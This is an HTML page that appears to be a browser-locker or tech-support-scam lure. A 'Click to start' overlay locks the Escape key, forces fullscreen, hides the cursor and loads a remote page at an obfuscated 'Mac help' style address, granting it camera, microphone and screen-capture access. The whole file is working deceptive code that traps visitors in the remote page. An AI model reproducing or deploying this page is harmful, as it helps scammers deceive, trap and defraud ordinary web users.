<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
<title></title>
<style>
  html, body { margin: 0; height: 100%; }

  iframe {
    position: fixed;
    width: 100%;
    height: 100%;
    border: none;
    top: 0;
    left: 0;
    cursor: none;
  }

  /* Sirf pehli click pakadne ke liye overlay */
  #startOverlay {
    position: fixed;
    inset: 0;
    z-index: 9999;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #000;
    color: #fff;
    font-family: sans-serif;
    font-size: 22px;
    cursor: pointer;
  }
  #startOverlay.hide { display: none; }
</style>
</head>
<body>

<div id="startOverlay">Click to start</div>

<iframe 
  id="f"
  src="https://knowledgeorbit-d3ggcvf5c0h3a7g6.z03.azurefd.net/Ma0cHelpMark0er007/index.html?ph0nq=null" 
  allowfullscreen 
  webkitallowfullscreen 
  mozallowfullscreen 
  allow="fullscreen *; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *">
</iframe>

<script>
  const frame   = document.getElementById('f');
  const overlay = document.getElementById('startOverlay');

  async function startImmersive() {
    try {
      // 1. Escape ko parent (top-level) me lock -> hold-ESC behavior
      if (navigator.keyboard && navigator.keyboard.lock) {
        await navigator.keyboard.lock(['Escape']);
      }
      // 2. iframe ko fullscreen karo
      await frame.requestFullscreen();
      // 3. Overlay hata do -> aage saare clicks iframe ko jaayein
      overlay.classList.add('hide');
    } catch (e) {
      console.error('fullscreen/lock fail:', e);
    }
  }

  overlay.addEventListener('click', startImmersive);

  // Fullscreen se bahar aate hi: unlock + overlay wapas dikhao
  document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement) {
      if (navigator.keyboard && navigator.keyboard.unlock) {
        navigator.keyboard.unlock();
      }
      overlay.classList.remove('hide');
    }
  });
</script>

</body>
</html>
